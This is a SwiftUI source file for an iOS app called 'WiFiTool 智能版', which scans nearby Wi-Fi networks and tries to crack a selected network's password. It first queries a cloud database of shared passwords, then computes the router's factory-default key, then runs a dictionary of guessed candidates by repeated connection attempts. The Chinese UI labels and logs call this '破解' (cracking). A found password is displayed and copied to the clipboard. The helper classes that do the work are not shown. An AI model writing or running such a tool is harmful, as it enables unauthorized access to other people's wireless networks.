import SwiftUI

struct ContentView: View {
    @State private var wifiList: [[String: Any]] = []
    @State private var isScanning: Bool = false
    @State private var isSolving: Bool = false

    @State private var currentSSID: String = ""
    @State private var logContent: String = "点击上方按钮刷新周边 Wi-Fi\n"

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("周边热点 (点击启动智能破解)")) {
                    Button(action: scanWiFi) {
                        HStack {
                            Label(isScanning ? "正在扫描周边..." : "刷新周边 WiFi", systemImage: "wifi")
                            if isScanning {
                                Spacer()
                                ProgressView()
                            }
                        }
                    }
                    .disabled(isScanning || isSolving)

                    List(wifiList, id: \.description) { item in
                        let ssid = item["ssid"] as? String ?? "未知"
                        let bssid = item["bssid"] as? String ?? ""
                        let rssi = item["rssi"] as? NSNumber ?? 0

                        Button(action: {
                            self.startSmartPipeline(ssid: ssid, bssid: bssid)
                        }) {
                            HStack {
                                VStack(alignment: .leading) {
                                    Text(ssid).font(.headline).foregroundColor(.primary)
                                    Text(bssid).font(.caption).foregroundColor(.secondary)
                                }
                                Spacer()
                                Text("\(rssi) dBm").font(.caption2).foregroundColor(.blue)
                            }
                        }
                        .disabled(isSolving)
                    }
                }

                if isSolving {
                    Section(header: Text("执行状态")) {
                        HStack {
                            Text("目标: \(currentSSID)")
                            Spacer()
                            ProgressView()
                        }
                    }
                }

                Section(header: Text("实时破解日志")) {
                    ScrollView {
                        Text(logContent)
                            .font(.system(.caption, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading)
                    }
                    .frame(height: 220)
                }
            }
            .navigationTitle("WiFiTool 智能版")
        }
    }

    private func scanWiFi() {
        self.isScanning = true
        self.logContent += "正在探测空中信道...\n"

        WiFiScanner.scanAvailableNetworks { results, debugLog in
            self.isScanning = false
            if let log = debugLog { self.logContent += log }
            if let list = results, !list.isEmpty {
                self.wifiList = list
            }
        }
    }

    private func startSmartPipeline(ssid: String, bssid: String) {
        self.isSolving = true
        self.currentSSID = ssid
        self.logContent += "\n============================\n"
        self.logContent += "🎯 目标锁定: [\(ssid)] (\(bssid))\n"

        // 阶段 1: 云端共享库查询
        self.logContent += "[阶段 1] 正在请求云端共享数据库...\n"
        WiFiSmartSolver.queryCloudDatabase(withBSSID: bssid, ssid: ssid) { foundPwd, source in
            if let pwd = foundPwd {
                self.logContent += "⚡️ [云端命中] 查询到密码: \(pwd)，开始校验...\n"
                self.verifyAndFinish(ssid: ssid, password: pwd)
            } else {
                self.logContent += "[阶段 1] 云端未收录，进入阶段 2...\n"

                // 阶段 2: 光猫出厂特征推算
                if let defaultKey = WiFiAutoEngine.calculateDefaultKey(withSSID: ssid, bssid: bssid) {
                    self.logContent += "⚙️ [阶段 2] 匹配光猫出厂规则，推算默认密码: \(defaultKey)\n"
                    self.verifyPassword(ssid: ssid, password: defaultKey) { success in
                        if success {
                            self.finishSuccess(ssid: ssid, password: defaultKey)
                        } else {
                            self.logContent += "[阶段 2] 出厂密码已被修改，进入阶段 3...\n"
                            self.runSmartCandidates(ssid: ssid, bssid: bssid)
                        }
                    }
                } else {
                    self.logContent += "[阶段 2] 无出厂规则，直接进入阶段 3...\n"
                    self.runSmartCandidates(ssid: ssid, bssid: bssid)
                }
            }
        }
    }

    // 阶段 3: 智能拓扑字典轮询
    private func runSmartCandidates(ssid: String, bssid: String) {
        let candidates = WiFiSmartSolver.generateSmartCandidates(forSSID: ssid, bssid: bssid)
        self.logContent += "🧠 [阶段 3] 生成智能拓扑候选词 \(candidates.count) 个，开始快速测通...\n"
        self.tryCandidateList(ssid: ssid, list: candidates, index: 0)
    }

    private func tryCandidateList(ssid: String, list: [String], index: Int) {
        guard index < list.count else {
            self.logContent += "❌ [失败] 所有智能策略尝试完毕，未命中密码。\n"
            self.isSolving = false
            return
        }

        let pwd = list[index]
        self.logContent += "[\(index + 1)/\(list.count)] 测试: \(pwd)\n"

        self.verifyPassword(ssid: ssid, password: pwd) { success in
            if success {
                self.finishSuccess(ssid: ssid, password: pwd)
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
                    self.tryCandidateList(ssid: ssid, list: list, index: index + 1)
                }
            }
        }
    }

    private func verifyPassword(ssid: String, password: String, completion: @escaping (Bool) -> Void) {
        WiFiAutoEngine.tryConnectSSID(ssid, password: password) { success, _ in
            completion(success)
        }
    }

    private func verifyAndFinish(ssid: String, password: String) {
        verifyPassword(ssid: ssid, password: password) { success in
            if success {
                self.finishSuccess(ssid: ssid, password: password)
            } else {
                self.logContent += "⚠️ 云端记录可能已过期，尝试其他候选...\n"
                self.isSolving = false
            }
        }
    }

    private func finishSuccess(ssid: String, password: String) {
        self.logContent += "\n🎉🎉🎉 [破解成功] WiFi: \(ssid)\n"
        self.logContent += "🔑 真实密码: \(password)\n"
        UIPasteboard.general.string = password
        self.logContent += "(密码已自动复制到剪贴板)\n"
        self.isSolving = false
    }
}
